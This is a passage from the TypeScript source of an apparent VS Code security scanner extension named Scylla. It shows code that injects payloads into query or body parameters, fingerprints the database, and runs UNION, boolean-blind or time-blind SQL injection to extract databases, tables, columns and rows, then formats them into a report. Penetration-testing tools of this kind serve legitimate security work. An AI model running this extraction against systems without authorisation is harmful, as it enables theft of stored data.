			followRedirects: true,
			quiet: true,
			maxBodyBytes: 128 * 1024,
		};

		if (headers) { sendOptions.headers = { ...headers }; }
		if (cookie) {
			sendOptions.headers = {
				...(sendOptions.headers as Record<string, string> ?? {}),
				cookie,
			};
		}

		if (param.location === 'query') {
			url.searchParams.set(param.name, payload);
			sendOptions.url = url.href;
			sendOptions.method = 'GET';
		} else if (param.location === 'body') {
			sendOptions.url = url.href;
			sendOptions.method = 'POST';
			sendOptions.body = `${encodeURIComponent(param.name)}=${encodeURIComponent(payload)}`;
			sendOptions.headers = {
				...(sendOptions.headers as Record<string, string> ?? {}),
				'content-type': 'application/x-www-form-urlencoded',
			};
		} else {
			return null;
		}

		const result = await vscode.commands.executeCommand<{
			response: {
				statusCode: number;
				bodyText: string;
				elapsedMs: number;
			};
		}>('scylla.http.sendHeadless', sendOptions);

		if (!result?.response) { return null; }
		return {
			bodyText: result.response.bodyText,
			elapsedMs: result.response.elapsedMs,
			statusCode: result.response.statusCode,
		};
	} catch {
		return null;
	}
}

function sleep(ms: number): Promise<void> {
	return new Promise(resolve => setTimeout(resolve, ms));
}

// ---------------------------------------------------------------------------
// Main extraction entry point
// ---------------------------------------------------------------------------

export async function extractSqli(
	targetUrl: string,
	parameter: { name: string; location: 'query' | 'body' },
	options?: {
		dbms?: string;
		technique?: string;
		maxRows?: number;
		delayMs?: number;
		timeoutMs?: number;
		headers?: Record<string, string>;
		cookie?: string;
	},
): Promise<SqliExtractResult> {
	const delayMs = options?.delayMs ?? DEFAULT_DELAY_MS;
	const timeoutMs = options?.timeoutMs ?? DEFAULT_TIMEOUT_MS;
	const maxRows = options?.maxRows ?? DEFAULT_MAX_ROWS;
	const start = Date.now();

	const param: ParameterTarget = { name: parameter.name, location: parameter.location };

	// Step 1: Fingerprint the DBMS
	const dbms = options?.dbms ?? await fingerprint(targetUrl, param, timeoutMs, options?.headers, options?.cookie);

	// Step 2: Determine technique
	let technique: 'union' | 'boolean-blind' | 'time-blind' = 'union';
	if (options?.technique === 'boolean-blind' || options?.technique === 'time-blind') {
		technique = options.technique;
	}

	let databases: string[] = [];
	let tables: Array<{ database: string; table: string }> = [];
	let columns: Array<{ database: string; table: string; column: string }> = [];
	let extractedData: Array<{ table: string; columns: string[]; rows: string[][] }> = [];

	if (technique === 'union') {
		// Try UNION-based first
		const columnCount = await detectColumnCount(targetUrl, param, timeoutMs, delayMs, options?.headers, options?.cookie);

		if (columnCount > 0) {
			const result = await unionExtractAll(
				targetUrl, param, dbms, columnCount, maxRows,
				timeoutMs, delayMs, options?.headers, options?.cookie,
			);
			databases = result.databases;
			tables = result.tables;
			columns = result.columns;
			extractedData = result.extractedData;
		} else {
			// Fallback to boolean-blind if UNION detection fails
			technique = 'boolean-blind';
		}
	}

	if (technique === 'boolean-blind') {
		const result = await booleanBlindExtractAll(
			targetUrl, param, dbms, maxRows,
			timeoutMs, delayMs, options?.headers, options?.cookie,
		);
		databases = result.databases;
		tables = result.tables;
		columns = result.columns;
		extractedData = result.extractedData;
	}

	if (technique === 'time-blind') {
		const result = await timeBlindExtractAll(
			targetUrl, param, dbms, maxRows,
			timeoutMs, delayMs, options?.headers, options?.cookie,
		);
		databases = result.databases;
		tables = result.tables;
		columns = result.columns;
		extractedData = result.extractedData;
	}

	return {
		generatedAt: new Date().toISOString(),
		target: targetUrl,
		parameter: parameter.name,
		dbms,
		technique,
		databases,
		tables,
		columns,
		extractedData,
		elapsedMs: Date.now() - start,
	};
}

// ---------------------------------------------------------------------------
// Report generation
// ---------------------------------------------------------------------------

export function generateSqliExtractReport(result: SqliExtractResult): string {
	const lines: string[] = [];
	lines.push('# Scylla Scanner - SQLi Data Extraction Report');
	lines.push('');
	lines.push(`- **Target:** \`${result.target}\``);
	lines.push(`- **Parameter:** \`${result.parameter}\``);
	lines.push(`- **DBMS:** ${result.dbms.toUpperCase()}`);
	lines.push(`- **Technique:** ${result.technique}`);
	lines.push(`- **Elapsed:** ${result.elapsedMs} ms`);
	lines.push(`- **Generated:** ${result.generatedAt}`);
	lines.push('');

	// Databases
	lines.push('## Databases');
	lines.push('');
	if (result.databases.length === 0) {
		lines.push('No databases extracted.');
	} else {
		for (const db of result.databases) {
			lines.push(`- \`${db}\``);
		}
	}
	lines.push('');

	// Tables
	lines.push('## Tables');
	lines.push('');
	if (result.tables.length === 0) {
		lines.push('No tables extracted.');
	} else {
		lines.push('| Database | Table |');
		lines.push('|----------|-------|');
		for (const t of result.tables) {
			lines.push(`| \`${t.database}\` | \`${t.table}\` |`);
		}
	}
	lines.push('');

	// Columns
	lines.push('## Columns');
	lines.push('');
	if (result.columns.length === 0) {
		lines.push('No columns extracted.');
	} else {
		lines.push('| Database | Table | Column |');
		lines.push('|----------|-------|--------|');
		for (const c of result.columns) {
			lines.push(`| \`${c.database}\` | \`${c.table}\` | \`${c.column}\` |`);
		}
	}
	lines.push('');

	// Extracted Data
	lines.push('## Extracted Data');
	lines.push('');
	if (result.extractedData.length === 0) {
		lines.push('No data extracted.');
	} else {
		for (const data of result.extractedData) {
			lines.push(`### ${data.table}`);
			lines.push('');
			lines.push('| ' + data.columns.map(c => `\`${c}\``).join(' | ') + ' |');
			lines.push('| ' + data.columns.map(() => '---').join(' | ') + ' |');
			for (const row of data.rows) {
				lines.push('| ' + row.map(v => `\`${v}\``).join(' | ') + ' |');
			}
			lines.push('');
		}
	}

	return lines.join('\n');
}
